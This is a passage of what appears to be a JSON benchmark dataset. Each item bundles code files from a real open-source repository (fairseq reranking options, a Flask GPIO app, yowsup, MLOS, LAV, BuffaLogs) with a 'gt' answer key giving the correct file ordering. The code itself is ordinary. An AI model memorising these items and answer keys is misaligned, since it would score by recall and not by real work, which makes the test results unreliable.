QuitDal(self.data)\n        self.info = dal.info\n\n    def make_display_lines(self):\n        self.screen_height, self.screen_width = self.linesnum()\n        display_lines = []\n\n        for i in range(self.screen_height):\n            if i == self.screen_height / 2:\n                display_lines.append(' ' * ((self.screen_width - 18)/2) + self.info + '\\r')\n            else:\n                display_lines.append('\\r')\n\n        self.display_lines = display_lines\n\n'douban.fm/doubanfm/views/help_view.py'\n:\n\nfrom __future__ import print_function\nfrom doubanfm.views.lrc_view import Lrc\nfrom doubanfm.dal.dal_help import HelpDal\n\n\nclass Help(Lrc):\n\n    def __init__(self, data):\n        super(Help, self).__init__(data)\n\n    def set_dal(self):\n        dal = HelpDal(self.data)\n        self.c = dal.c\n        self.set_title(dal.title)\n        self.set_suffix_selected(dal.suffix_selected)\n        self.set_lines(dal.lines)\n\n    def display(self):\n        self.set_dal()\n        self.make_display_lines()\n        print('\\n'.join(self.display_lines))\n\n    def make_display_lines(self):\n        self.screen_height, self.screen_width = self.linesnum()\n\n        display_lines = ['']\n        display_lines.append(self._title + '\\r')\n        display_lines.append('')\n\n        display_lines.extend(self._lines)\n        for i in range(self.screen_height - len(display_lines) - 1):\n            display_lines.append('')\n\n        self.display_lines = display_lines\n",
        "gt": [
            "'douban.fm/doubanfm/views/help_view.py'",
            "'douban.fm/doubanfm/views/quit_view.py'",
            "'douban.fm/doubanfm/controller/quit_controller.py'",
            "'douban.fm/doubanfm/douban.py'"
        ]
    },
    {
        "files": [
            "'Transformer-Clinic/fairseq/examples/noisychannel/__init__.py'",
            "'Transformer-Clinic/fairseq/examples/__init__.py'",
            "'Transformer-Clinic/fairseq/examples/noisychannel/rerank_options.py'"
        ],
        "content": "'Transformer-Clinic/fairseq/examples/noisychannel/__init__.py'\n:\n\n\n\n\nfrom .rerank_options import *\n\n'Transformer-Clinic/fairseq/examples/__init__.py'\n:\n\n\n\n\n__version__ = '0.8.0'\n\nimport examples.noisychannel\n\n'Transformer-Clinic/fairseq/examples/noisychannel/rerank_options.py'\n:\n\n\n\n\nfrom fairseq import options\n\n\ndef get_reranking_parser(default_task='translation'):\n    parser = options.get_parser('Generation and reranking', default_task)\n    add_reranking_args(parser)\n    return parser\n\n\ndef get_tuning_parser(default_task='translation'):\n    parser = options.get_parser('Reranking tuning', default_task)\n    add_reranking_args(parser)\n    add_tuning_args(parser)\n    return parser\n\n\ndef add_reranking_args(parser):\n    group = parser.add_argument_group(\"Reranking\")\n\n    group.add_argument('--score-model1', '-s1', type=str, metavar='FILE', required=True,\n                       help='path to first model or ensemble of models for rescoring')\n    group.add_argument('--score-model2', '-s2', type=str, metavar='FILE', required=False,\n                       help='path to second model or ensemble of models for rescoring')\n    group.add_argument('--num-rescore', '-n', type=int, metavar='N', default=10,\n                       help='the number of candidate hypothesis to rescore')\n    group.add_argument('-bz', '--batch-size', type=int, metavar='N', default=128,\n                       help='batch size for generating the nbest list')\n    group.add_argument('--gen-subset', default='test', metavar='SET', choices=['test', 'train', 'valid'],\n                       help='data subset to generate (train, valid, test)')\n    group.add_argument('--gen-model', default=None, metavar='FILE',\n                       help='the model to generate translations')\n    group.add_argument('-b1', '--backwards1', action='store_true',\n                       help='whether or not the first model group is backwards')\n    group.add_argument('-b2', '--backwards2', action='store_true',\n                       help='whether or not the second model group is backwards')\n    group.add_argument('-a', '--weight1', default=1, nargs='+', type=float,\n                       help='the weight(s) of the first model')\n    group.add_argument('-b', '--weight2', default=1, nargs='+', type=float,\n                       help='the weight(s) of the second model, or the gen model if using nbest from interactive.py')\n    group.add_argument('-c', '--weight3', default=1, nargs='+', type=float,\n                       help='the weight(s) of the third model')\n\n\n    group.add_argument('-lm', '--language-model', default=None, metavar='FILE',\n                       help='language model for target language to rescore translations')\n    group.add_argument('--lm-dict', default=None, metavar='FILE',\n                       help='the dict of the language model for the target language')\n    group.add_argument('--lm-name', default=None,\n                       help='the name of the language model for the target language')\n    group.add_argument('--lm-bpe-code', default=None, metavar='FILE',\n                       help='the bpe code for the language model for the target language')\n    group.add_argument('--data-dir-name', default=None,\n                       help='name of data directory')\n    group.add_argument('--lenpen', default=1, nargs='+', type=float,\n                       help='length penalty: <1.0 favors shorter, >1.0 favors longer sentences')\n    group.add_argument('--score-dict-dir', default=None,\n                       help='the directory with dictionaries for the scoring models')\n    group.add_argument('--right-to-left1', action='store_true',\n                       help='whether the first model group is a right to left model')\n    group.add_argument('--right-to-left2', action='store_true',\n                       help='whether the second model group is a right to left model')\n    group.add_argument('--remove-bpe', default='@@ ',\n                       help='the bpe symbol, used for the bitext and LM')\n    group.add_argument('--prefix-len', default=None, type=int,\n                       help='the length of the target prefix to use in rescoring (in terms of words wo bpe)')\n    group.add_argument('--sampling', action='store_true',\n                       help='use sampling instead of beam search for generating n best list')\n    group.add_argument('--diff-bpe', action='store_true',\n                       help='bpe for rescoring and nbest list not the same')\n    group.add_argument('--rescore-bpe-code', default=None,\n                       help='bpe code for rescoring models')\n    group.add_argument('--nbest-list', default=None,\n                       help='use predefined nbest list in interactive.py format')\n    group.add_argument('--write-hypos', default=None,\n                       help='filename prefix to write hypos to')\n    group.add_argument('--ref-translation', default=None,\n                       help='reference translation to use with nbest list from interactive.py')\n    group.add_argument('--backwards-score-dict-dir', default=None,\n                       help='the directory with dictionaries for the backwards model,'\n                            'if None then it is assumed the fw and backwards models share dictionaries')\n\n\n    group.add_argument('--gen-model-name', default=None,\n                       help='the name of the models that generated the nbest list')\n    group.add_argument('--model1-name', default=None,\n                       help='the name of the set for model1 group ')\n    group.add_argument('--model2-name', default=None,\n                       help='the name of the set for model2 group')\n    group.add_argument('--shard-id', default=0, type=int,\n                       help='the id of the shard to generate')\n    group.add_argument('--num-shards', default=1, type=int,\n                       help='the number of shards to generate across')\n    group.add_argument('--all-shards', action='store_true',\n                       help='use all shards')\n    group.add_argument('--target-prefix-frac', default=None, type=float,\n                       help='the fraction of the target prefix to use in rescoring (in terms of words wo bpe)')\n    group.add_argument('--source-prefix-frac', default=None, type=float,\n                       help='the fraction of the source prefix to use in rescoring (in terms of words wo bpe)')\n    group.add_argument('--normalize', action='store_true',\n                       help='whether to normalize by src and target len')\n\n    return group\n\n\ndef add_tuning_args(parser):\n    group = parser.add_argument_group(\"Tuning\")\n\n    group.add_argument('--lower-bound', default=[-0.7], nargs='+', type=float,\n                       help='lower bound of search space')\n    group.add_argument('--upper-bound', default=[3], nargs='+', type=float,\n                       help='upper bound of search space')\n    group.add_argument('--tune-param', default=['lenpen'], nargs='+',\n                       choices=['lenpen', 'weight1', 'weight2', 'weight3'],\n                       help='the parameter(s) to tune')\n    group.add_argument('--tune-subset', default='valid', choices=['valid', 'test', 'train'],\n                       help='the subset to tune on ')\n    group.add_argument('--num-trials', default=1000, type=int,\n                       help='number of trials to do for random search')\n    group.add_argument('--share-weights', action='store_true',\n                       help='share weight2 and weight 3')\n    return group\n",
        "gt": [
            "'Transformer-Clinic/fairseq/examples/noisychannel/rerank_options.py'",
            "'Transformer-Clinic/fairseq/examples/noisychannel/__init__.py'",
            "'Transformer-Clinic/fairseq/examples/__init__.py'"
        ]
    },
    {
        "files": [
            "'Geppetto/app/models/__init__.py'",
            "'Geppetto/tests/conftest.py'",
            "'Geppetto/app/__init__.py'",
            "'Geppetto/app/models/user.py'"
        ],
        "content": "'Geppetto/app/models/__init__.py'\n:from .user import User\n\n'Geppetto/tests/conftest.py'\n:import os\n\nos.environ['GEPPETTO_ENV'] = 'test'\n\nimport pytest\nfrom base64 import b64encode\n\nfrom app import app as application\nfrom app import db\nfrom app.models import User\n\n\n@pytest.fixture(scope='module', autouse=True)\ndef setup_db():\n    db.create_all()\n\n\n@pytest.fixture(scope='function', autouse=True)\ndef patch(monkeypatch, tmpdir):\n\n    monkeypatch.setattr('quick2wire.gpio.gpio_admin',\n                        lambda subcommand, pin, pull=None: None)\n\n    def mock_pin_path(self, filename):\n        f = tmpdir.join(filename)\n        f.write(0)\n        return f.strpath\n\n    monkeypatch.setattr('quick2wire.gpio.Pin._pin_path', mock_pin_path)\n\n\n@pytest.fixture\ndef user():\n\n    u = User(api_key='c7dc072d-6c5d-4b16-8189-6f95147275e5')\n    db.session.add(u)\n    db.session.commit()\n\n    return u\n\n\n@pytest.fixture\ndef auth_header(user):\n\n    return {'Authorization': b64encode(user.api_key.encode('utf-8'))}\n\n\n@pytest.fixture\ndef client():\n\n    return application.test_client()\n\n'Geppetto/app/__init__.py'\n:import os\nimport base64\nimport binascii\nfrom flask import Flask, Response\nfrom flask.ext.login import LoginManager, login_required\nfrom flask.ext.sqlalchemy import SQLAlchemy\nfrom flask.ext.cors import CORS\n\nfrom app.api import gpio\n\n_cur_path = os.path.dirname(os.path.abspath(__name__))\n\napp = Flask(__name__)\napp.secret_key = os.urandom(24)\n\napp.register_blueprint(gpio, url_prefix='/gpio')\napp.config['SQLALCHEMY_DATABASE_URI'] = \\\n    'sqlite:///%s/data/geppettov.db' % _cur_path\n\nif 'GEPPETTO_ENV' in os.environ and os.environ['GEPPETTO_ENV'] == 'dev':\n    app.config.update(\n        DEBUG=True,\n        LOGIN_DISABLED=True,\n        TESTING=True,\n        SQLALCHEMY_DATABASE_URI='sqlite:///%s/data/geppetto_dev.db' % _cur_path\n    )\n\nif 'GEPPETTO_ENV' in os.environ and os.environ['GEPPETTO_ENV'] == 'test':\n    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite://'\n\nlogin_manager = LoginManager()\nlogin_manager.init_app(app)\n\ndb = SQLAlchemy(app)\nCORS(app, headers=['Content-Type', 'Authorization'])\n\nfrom app.models import User\n\n\n@login_manager.request_loader\ndef load_user_from_request(request):\n\n    key = request.headers.get('Authorization')\n\n    if key:\n        key = key.replace('Basic ', '', 1)\n        try:\n            key = base64.b64decode(key)\n        except (TypeError, binascii.Error):\n            return None\n\n        try:\n            user = User.query.filter_by(api_key=key.decode('utf-8')).first()\n        except UnicodeError:\n            return None\n\n        if user:\n            return user\n\n    return None\n\n\n@app.route('/test_authentication')\n@login_required\ndef test_authentication():\n\n    return Response(status=200)\n\n'Geppetto/app/models/user.py'\n:from flask.ext.login import UserMixin\n\nfrom app import db\n\n\nclass User(db.Model, UserMixin):\n\n    __tablename__ = 'user'\n\n    id = db.Column(db.Integer, primary_key=True)\n    api_key = db.Column(db.String(50))\n\n    def __repr__(self):\n\n        return '<User %s, api_key: %s>' %\\\n            (self.id if hasattr(self, 'id') else None, self.api_key)\n",
        "gt": [
            "'Geppetto/app/models/user.py'",
            "'Geppetto/app/models/__init__.py'",
            "'Geppetto/app/__init__.py'",
            "'Geppetto/tests/conftest.py'"
        ]
    },
    {
        "files": [
            "'yowsup/yowsup/demos/echoclient/stack.py'",
            "'yowsup/yowsup/stacks/__init__.py'",
            "'yowsup/yowsup/demos/echoclient/__init__.py'",
            "'yowsup/yowsup/layers/protocol_media/__init__.py'"
        ],
        "content": "'yowsup/yowsup/demos/echoclient/stack.py'\n:from yowsup.stacks import  YowStackBuilder\nfrom .layer import EchoLayer\nfrom yowsup.layers import YowLayerEvent\nfrom yowsup.layers.network import YowNetworkLayer\n\n\nclass YowsupEchoStack(object):\n    def __init__(self, profile):\n        stackBuilder = YowStackBuilder()\n\n        self._stack = stackBuilder\\\n            .pushDefaultLayers()\\\n            .push(EchoLayer)\\\n            .build()\n\n        self._stack.setProfile(profile)\n\n    def set_prop(self, key, val):\n        self._stack.setProp(key, val)\n\n    def start(self):\n        self._stack.broadcastEvent(YowLayerEvent(YowNetworkLayer.EVENT_STATE_CONNECT))\n        self._stack.loop()\n\n'yowsup/yowsup/stacks/__init__.py'\n:from .yowstack import YowStack, YowStackBuilder\n\nfrom yowsup.layers.auth                        import YowAuthenticationProtocolLayer\nfrom yowsup.layers.coder                       import YowCoderLayer\nfrom yowsup.layers.logger                      import YowLoggerLayer\nfrom yowsup.layers.network                     import YowNetworkLayer\nfrom yowsup.layers.protocol_messages           import YowMessagesProtocolLayer\nfrom yowsup.layers.protocol_media              import YowMediaProtocolLayer\nfrom yowsup.layers.protocol_acks               import YowAckProtocolLayer\nfrom yowsup.layers.protocol_receipts           import YowReceiptProtocolLayer\nfrom yowsup.layers.protocol_groups             import YowGroupsProtocolLayer\nfrom yowsup.layers.protocol_presence           import YowPresenceProtocolLayer\nfrom yowsup.layers.protocol_ib                 import YowIbProtocolLayer\nfrom yowsup.layers.protocol_notifications      import YowNotificationsProtocolLayer\nfrom yowsup.layers.protocol_iq                 import YowIqProtocolLayer\nfrom yowsup.layers.protocol_contacts           import YowContactsIqProtocolLayer\nfrom yowsup.layers.protocol_chatstate          import YowChatstateProtocolLayer\nfrom yowsup.layers.protocol_privacy            import YowPrivacyProtocolLayer\nfrom yowsup.layers.protocol_profiles           import YowProfilesProtocolLayer\nfrom yowsup.layers.protocol_calls              import YowCallsProtocolLayer\nfrom yowsup.layers.noise.layer                 import YowNoiseLayer\nfrom yowsup.layers.noise.layer_noise_segments  import YowNoiseSegmentsLayer\n\n\n\nYOWSUP_CORE_LAYERS = (\n    YowLoggerLayer,\n    YowCoderLayer,\n    YowNoiseLayer,\n    YowNoiseSegmentsLayer,\n    YowNetworkLayer\n)\n\n\nYOWSUP_PROTOCOL_LAYERS_BASIC = (\n    YowAuthenticationProtocolLayer, YowMessagesProtocolLayer,\n    YowReceiptProtocolLayer, YowAckProtocolLayer, YowPresenceProtocolLayer,\n    YowIbProtocolLayer, YowIqProtocolLayer, YowNotificationsProtocolLayer,\n    YowContactsIqProtocolLayer, YowChatstateProtocolLayer\n\n)\n\nYOWSUP_PROTOCOL_LAYERS_GROUPS = (YowGroupsProtocolLayer,) + YOWSUP_PROTOCOL_LAYERS_BASIC\nYOWSUP_PROTOCOL_LAYERS_MEDIA  = (YowMediaProtocolLayer,) + YOWSUP_PROTOCOL_LAYERS_BASIC\nYOWSUP_PROTOCOL_LAYERS_PROFILES  = (YowProfilesProtocolLayer,) + YOWSUP_PROTOCOL_LAYERS_BASIC\nYOWSUP_PROTOCOL_LAYERS_CALLS  = (YowCallsProtocolLayer,) + YOWSUP_PROTOCOL_LAYERS_BASIC\nYOWSUP_PROTOCOL_LAYERS_FULL = (YowGroupsProtocolLayer, YowMediaProtocolLayer, YowPrivacyProtocolLayer, YowProfilesProtocolLayer, YowCallsProtocolLayer)\\\n                              + YOWSUP_PROTOCOL_LAYERS_BASIC\n\n\nYOWSUP_FULL_STACK = (YOWSUP_PROTOCOL_LAYERS_FULL,) +\\\n                     YOWSUP_CORE_LAYERS\n\n'yowsup/yowsup/demos/echoclient/__init__.py'\n:from .stack import YowsupEchoStack\n'yowsup/yowsup/layers/protocol_media/__init__.py'\n:from .layer import YowMediaProtocolLayer\n",
        "gt": [
            "'yowsup/yowsup/layers/protocol_media/__init__.py'",
            "'yowsup/yowsup/stacks/__init__.py'",
            "'yowsup/yowsup/demos/echoclient/stack.py'",
            "'yowsup/yowsup/demos/echoclient/__init__.py'"
        ]
    },
    {
        "files": [
            "'MLOS/mlos_bench/mlos_bench/os_environ.py'",
            "'MLOS/mlos_bench/mlos_bench/dict_templater.py'",
            "'MLOS/mlos_bench/mlos_bench/tests/dict_templater_test.py'"
        ],
        "content": "'MLOS/mlos_bench/mlos_bench/os_environ.py'\n:\n\n\n\n\n\nimport os\nimport sys\n\n\nif sys.platform == 'win32':\n    import nt\n\nif sys.version_info >= (3, 10):\n    from typing import TypeAlias\nelse:\n    from typing_extensions import TypeAlias\n\nif sys.version_info >= (3, 9):\n    EnvironType: TypeAlias = os._Environ[str]\nelse:\n    EnvironType: TypeAlias = os._Environ\n\n\n\nenviron: EnvironType = nt.environ if sys.platform == 'win32' else os.environ\n\n__all__ = ['environ']\n\n'MLOS/mlos_bench/mlos_bench/dict_templater.py'\n:\n\n\n\n\n\nfrom copy import deepcopy\nfrom string import Template\nfrom typing import Any, Dict, Optional\n\nfrom mlos_bench.os_environ import environ\n\n\nclass DictTemplater:\n\n\n    def __init__(self, source_dict: Dict[str, Any]):\n\n\n        self._template_dict = deepcopy(source_dict)\n\n        self._dict: Dict[str, Any] = {}\n\n    def expand_vars(self, *,\n                    extra_source_dict: Optional[Dict[str, Any]] = None,\n                    use_os_env: bool = False) -> Dict[str, Any]:\n\n        self._dict = deepcopy(self._template_dict)\n        self._dict = self._expand_vars(self._dict, extra_source_dict, use_os_env)\n        assert isinstance(self._dict, dict)\n        return self._dict\n\n    def _expand_vars(self, value: Any, extra_source_dict: Optional[Dict[str, Any]], use_os_env: bool) -> Any:\n\n        if isinstance(value, str):\n\n            value = Template(value).safe_substitute(self._dict)\n\n            if extra_source_dict:\n                value = Template(value).safe_substitute(extra_source_dict)\n\n            if use_os_env:\n                value = Template(value).safe_substitute(dict(environ))\n        elif isinstance(value, dict):\n\n\n            for (key, val) in value.items():\n                value[key] = self._expand_vars(val, extra_source_dict, use_os_env)\n        elif isinstance(value, list):\n            value = [self._expand_vars(val, extra_source_dict, use_os_env) for val in value]\n        elif isinstance(value, (int, float, bool)) or value is None:\n            return value\n        else:\n            raise ValueError(f\"Unexpected type {type(value)} for value {value}\")\n        return value\n\n'MLOS/mlos_bench/mlos_bench/tests/dict_templater_test.py'\n:\n\n\n\n\n\nfrom copy import deepcopy\nfrom typing import Any, Dict\n\nimport pytest\n\nfrom mlos_bench.dict_templater import DictTemplater\nfrom mlos_bench.os_environ import environ\n\n\n@pytest.fixture\ndef source_template_dict() -> Dict[str, Any]:\n\n    return {\n        \"extra_str-ref\": \"$extra_str-ref\",\n        \"str\": \"string\",\n        \"str_ref\": \"$str-ref\",\n        \"secondary_expansion\": \"${str_ref}\",\n        \"tertiary_expansion\": \"$secondary_expansion\",\n        \"int\": 1,\n        \"int_ref\": \"$int-ref\",\n        \"float\": 1.0,\n        \"float_ref\": \"$float-ref\",\n        \"bool\": True,\n        \"bool_ref\": \"$bool-ref\",\n        \"list\": [\n            \"$str\",\n            \"$int\",\n            \"$float\",\n        ],\n        \"dict\": {\n            \"nested-str-ref\": \"nested-$str-ref\",\n            \"nested-extra-str-ref\": \"nested-$extra_str-ref\",\n        },\n    }\n\n\n\n\n\ndef test_no_side_effects(source_template_dict: Dict[str, Any]) -> None:\n\n    source_template_dict_copy = deepcopy(source_template_dict)\n    results = DictTemplater(source_template_dict_copy).expand_vars()\n    assert results\n    assert source_template_dict_copy == source_template_dict\n\n\ndef test_secondary_expansion(source_template_dict: Dict[str, Any]) -> None:\n\n    results = DictTemplater(source_template_dict).expand_vars()\n    assert results == {\n        \"extra_str-ref\": \"$extra_str-ref\",\n        \"str\": \"string\",\n        \"str_ref\": \"string-ref\",\n        \"secondary_expansion\": \"string-ref\",\n        \"tertiary_expansion\": \"string-ref\",\n        \"int\": 1,\n        \"int_ref\": \"1-ref\",\n        \"float\": 1.0,\n        \"float_ref\": \"1.0-ref\",\n        \"bool\": True,\n        \"bool_ref\": \"True-ref\",\n        \"list\": [\n            \"string\",\n            \"1\",\n            \"1.0\",\n        ],\n        \"dict\": {\n            \"nested-str-ref\": \"nested-string-ref\",\n            \"nested-extra-str-ref\": \"nested-$extra_str-ref\",\n        },\n    }\n\n\ndef test_os_env_expansion(source_template_dict: Dict[str, Any]) -> None:\n\n    environ[\"extra_str\"] = \"os-env-extra_str\"\n    environ[\"string\"] = \"shouldn't be used\"\n\n    results = DictTemplater(source_template_dict).expand_vars(use_os_env=True)\n    assert results == {\n        \"extra_str-ref\": f\"{environ['extra_str']}-ref\",\n        \"str\": \"string\",\n        \"str_ref\": \"string-ref\",\n        \"secondary_expansion\": \"string-ref\",\n        \"tertiary_expansion\": \"string-ref\",\n        \"int\": 1,\n        \"int_ref\": \"1-ref\",\n        \"float\": 1.0,\n        \"float_ref\": \"1.0-ref\",\n        \"bool\": True,\n        \"bool_ref\": \"True-ref\",\n        \"list\": [\n            \"string\",\n            \"1\",\n            \"1.0\",\n        ],\n        \"dict\": {\n            \"nested-str-ref\": \"nested-string-ref\",\n            \"nested-extra-str-ref\": f\"nested-{environ['extra_str']}-ref\",\n        },\n    }\n\n\ndef test_from_extras_expansion(source_template_dict: Dict[str, Any]) -> None:\n\n    extra_source_dict = {\n        \"extra_str\": \"str-from-extras\",\n        \"string\": \"shouldn't be used\",\n    }\n    results = DictTemplater(source_template_dict).expand_vars(extra_source_dict=extra_source_dict)\n    assert results == {\n        \"extra_str-ref\": f\"{extra_source_dict['extra_str']}-ref\",\n        \"str\": \"string\",\n        \"str_ref\": \"string-ref\",\n        \"secondary_expansion\": \"string-ref\",\n        \"tertiary_expansion\": \"string-ref\",\n        \"int\": 1,\n        \"int_ref\": \"1-ref\",\n        \"float\": 1.0,\n        \"float_ref\": \"1.0-ref\",\n        \"bool\": True,\n        \"bool_ref\": \"True-ref\",\n        \"list\": [\n            \"string\",\n            \"1\",\n            \"1.0\",\n        ],\n        \"dict\": {\n            \"nested-str-ref\": \"nested-string-ref\",\n            \"nested-extra-str-ref\": f\"nested-{extra_source_dict['extra_str']}-ref\",\n        },\n    }\n",
        "gt": [
            "'MLOS/mlos_bench/mlos_bench/os_environ.py'",
            "'MLOS/mlos_bench/mlos_bench/dict_templater.py'",
            "'MLOS/mlos_bench/mlos_bench/tests/dict_templater_test.py'"
        ]
    },
    {
        "files": [
            "'LAV/lav/utils/datasets/rgb_dataset.py'",
            "'LAV/lav/utils/augmenter.py'",
            "'LAV/lav/utils/datasets/__init__.py'",
            "'LAV/lav/train_full.py'"
        ],
        "content": "'LAV/lav/utils/datasets/rgb_dataset.py'\n:import numpy as np\nimport cv2\nimport torch\n\nfrom lav.utils.augmenter import augment\nfrom lav.utils import filter_sem\nfrom .basic_dataset import BasicDataset\nfrom .lidar_dataset import transform_ego\n\nclass RGBDataset(BasicDataset):\n    def __init__(self, config_path):\n        super().__init__(config_path)\n\n        self.augmenter = augment(0.5)\n\n    def __getitem__(self, idx):\n\n        lmdb_txn = self.txn_map[idx]\n        index = self.idx_map[idx]\n\n        rgb1 = self.__class__.load_img(lmdb_txn, 'rgb_2', index)\n        rgb2 = self.__class__.load_img(lmdb_txn, 'rgb_3', index)\n        sem1 = self.__class__.load_img(lmdb_txn, 'sem_2', index)\n        sem2 = self.__class__.load_img(lmdb_txn, 'sem_3', index)\n\n\n        bev = self.__class__.load_bev(lmdb_txn, index, channels=[0,1,2,6])\n        bev = (bev>0).astype(np.uint8).transpose(2,0,1)\n\n        rgb = np.concatenate([rgb1, rgb2], axis=1)\n        sem = np.concatenate([sem1, sem2], axis=1)\n\n        rgb = self.augmenter(images=rgb[...,::-1][None])[0]\n        sem = filter_sem(sem, self.seg_channels)\n\n\n        ego_id, ego_locs, ego_oris, ego_bbox, msks, locs, oris, bbox, typs = self.__class__.filter(\n            lmdb_txn, index,\n            max_pedestrian_radius=self.max_pedestrian_radius,\n            max_vehicle_radius=self.max_vehicle_radius,\n            T=self.num_plan)\n\n\n        ego_locs, locs, oris, bbox, typs = transform_ego(ego_locs, locs, oris, bbox, typs, ego_oris[0], self.num_plan+1)\n\n        cmd = int(self.__class__.access('cmd', lmdb_txn, index, 1, dtype=np.uint8))\n        nxp = self.__class__.access('nxp', lmdb_txn, index, 1).reshape(2)\n\n        return rgb, sem, bev, -(ego_locs[1:]-ego_locs[:1]), cmd, nxp\n\n'LAV/lav/utils/augmenter.py'\n:import imgaug as ia\nfrom imgaug import augmenters as iaa\n\ndef augment(prob=0.2):\n\n    augmenter = iaa.Sequential([\n        iaa.Sometimes(prob, iaa.GaussianBlur((0, 0.5))),\n        iaa.Sometimes(prob, iaa.AdditiveGaussianNoise(loc=0, scale=(0., 0.05*255), per_channel=0.5)),\n        iaa.Sometimes(prob, iaa.Dropout((0.01, 0.1), per_channel=0.5)),\n        iaa.Sometimes(prob, iaa.Multiply((1/1.2, 1.2), per_channel=0.5)),\n        iaa.Sometimes(prob, iaa.LinearContrast((1/1.2, 1.2), per_channel=0.5)),\n        iaa.Sometimes(prob, iaa.Grayscale((0.0, 0.5))),\n        iaa.Sometimes(prob, iaa.ElasticTransformation(alpha=(0.5, 3.5), sigma=0.25)),\n    ], random_order=True)\n\n\n    return augmenter\n\n'LAV/lav/utils/datasets/__init__.py'\n:from .bev_dataset import BEVDataset\nfrom .rgb_dataset import RGBDataset\nfrom .seg_dataset import SegmentationDataset\nfrom .bra_dataset import BrakePredictionDataset\nfrom .lidar_dataset import LiDARDataset\nfrom .lidar_painted_dataset import LiDARPaintedDataset\nfrom .temporal_bev_dataset import TemporalBEVDataset\nfrom .temporal_lidar_painted_dataset import TemporalLiDARPaintedDataset\nfrom torch.utils.data import DataLoader\n\n\ndef get_data_loader(data_type, args):\n\n    if data_type == 'bev':\n        dataset_cls = BEVDataset\n    elif data_type == 'temporal_bev':\n        dataset_cls = TemporalBEVDataset\n    elif data_type == 'rgb':\n        dataset_cls = RGBDataset\n    elif data_type == 'seg':\n        dataset_cls = SegmentationDataset\n    elif data_type == 'bra':\n        dataset_cls = BrakePredictionDataset\n    elif data_type == 'lidar':\n        dataset_cls = LiDARDataset\n    elif data_type == 'lidar_painted':\n        dataset_cls = LiDARPaintedDataset\n    elif data_type == 'temporal_lidar_painted':\n        dataset_cls = TemporalLiDARPaintedDataset\n    else:\n        raise NotImplementedError\n\n    return DataLoader(\n        dataset_cls(args.config_path, seed=args.seed),\n        num_workers=args.num_workers,\n        batch_size=args.batch_size,\n        shuffle=True,\n        drop_last=True,\n        pin_memory=True,\n    )\n\n__all__ = ['get_data_loader']\n\n'LAV/lav/train_full.py'\n:import tqdm\nimport torch\nfrom lav.lav_final import LAV\nfrom lav.utils.datasets import get_data_loader\nfrom lav.utils.logger import Logger\n\ndef main(args):\n\n    lav = LAV(args)\n    data_loader = get_data_loader('lidar_painted' if lav.point_painting else 'lidar', args)\n    logger = Logger('lav_lidar', args)\n    save_dir = logger.save_dir\n\n    torch.manual_seed(args.seed)\n\n    logger.watch_model(lav.lidar_model)\n    logger.watch_model(lav.uniplanner)\n\n    global_it = 0\n    for epoch in range(args.num_epoch):\n        for data in tqdm.tqdm(data_loader, desc=f'Epoch {epoch}'):\n\n            opt_info = lav.train_lidar(*data)\n\n            if global_it % args.num_per_log == 0:\n                logger.log_lidar_info(global_it, opt_info)\n\n            global_it += 1\n\n        lav.lidar_scheduler.step()\n\n\n        if (epoch+1) % args.num_per_save == 0:\n            lidar_path = f'{save_dir}/lidar_{epoch+1}.th'\n            torch.save(lav.state_dict('lidar'), lidar_path)\n            print (f'saved to {lidar_path}')\n\n            uniplanner_path = f'{save_dir}/uniplanner_{epoch+1}.th'\n            torch.save(lav.state_dict('uniplanner'), uniplanner_path)\n            print (f'saved to {uniplanner_path}')\n\n            logger.save([lidar_path, uniplanner_path])\n\n\n\nif __name__ == '__main__':\n\n    import argparse\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument('--config-path', default='config.yaml')\n\n    parser.add_argument('--device', default='cuda', choices=['cuda', 'cpu'])\n\n    parser.add_argument('--perceive-only', action='store_true')\n\n\n    parser.add_argument('--num-epoch', type=int, default=64)\n    parser.add_argument('--num-per-log', type=int, default=100, help='log per iter')\n    parser.add_argument('--num-per-save', type=int, default=1, help='save per epoch')\n\n    parser.add_argument('--batch-size', type=int, default=32)\n    parser.add_argument('--lr', type=float, default=3e-4)\n    parser.add_argument('--num-workers', type=int, default=16)\n\n\n    parser.add_argument('--seed', type=int, default=2021)\n\n    args = parser.parse_args()\n\n    main(args)",
        "gt": [
            "'LAV/lav/utils/augmenter.py'",
            "'LAV/lav/utils/datasets/rgb_dataset.py'",
            "'LAV/lav/utils/datasets/__init__.py'",
            "'LAV/lav/train_full.py'"
        ]
    },
    {
        "files": [
            "'BuffaLogs/buffalogs/authentication/serializers.py'",
            "'BuffaLogs/buffalogs/authentication/models.py'",
            "'BuffaLogs/buffalogs/authentication/urls.py'",
            "'BuffaLogs/buffalogs/authentication/views.py'"
        ],
        "content": "'BuffaLogs/buffalogs/authentication/serializers.py'\n:from django.contrib import auth\nfrom django.contrib.auth import logout\nfrom rest_framework import serializers as rfs\nfrom rest_framework.exceptions import AuthenticationFailed\nfrom rest_framework_simplejwt.tokens import TokenError\n\nfrom .models import User\n\n\nclass RegisterSerializer(rfs.ModelSerializer):\n    password = rfs.CharField(max_length=68, min_length=6, write_only=True)\n\n    default_error_messages = {\"username\": \"The username should only contain alphanumeric characters\"}\n\n    class Meta:\n        model = User\n        fields = [\"email\", \"username\", \"password\"]\n\n    def validate(self, attrs):\n        email = attrs.get(\"email\", \"\")\n        username = attrs.get(\"username\", \"\")\n\n        user_filtered_by_email = User.objects.filter(email=email).first()\n        if user_filtered_by_email:\n            raise rfs.ValidationError(\"User with that email already exists\")\n\n        user_filtered_by_username = User.objects.filter(username=username).first()\n        if user_filtered_by_username:\n            raise rfs.ValidationError(\"User with that username already exists\")\n\n        if not username.isalnum():\n            raise rfs.ValidationError(self.default_error_messages)\n        return attrs\n\n    def create(self, validated_data):\n        return User.objects.create_user(**validated_data)\n\n\nclass LoginSerializer(rfs.ModelSerializer):\n    email = rfs.EmailField(max_length=255, min_length=3)\n    password = rfs.CharField(max_length=68, min_length=6, write_only=True)\n\n    tokens = rfs.SerializerMethodField()\n\n    def get_tokens(self, obj):\n        user = User.objects.get(email=obj[\"email\"])\n\n        return {\"refresh\": user.tokens()[\"refresh\"], \"access\": user.tokens()[\"access\"]}\n\n    class Meta:\n        model = User\n        fields = [\n            \"email\",\n            \"password\",\n            \"tokens\",\n        ]\n\n    def validate(self, attrs):\n        email = attrs.get(\"email\", \"\")\n        password = attrs.get(\"password\", \"\")\n\n        user = auth.authenticate(email=email, password=password)\n\n        if not user:\n            raise AuthenticationFailed(\"Invalid credentials, try again\")\n\n        return {\"email\": user.email, \"username\": user.username, \"tokens\": user.tokens}\n\n\nclass LogoutSerializer(rfs.Serializer):\n    default_error_message = 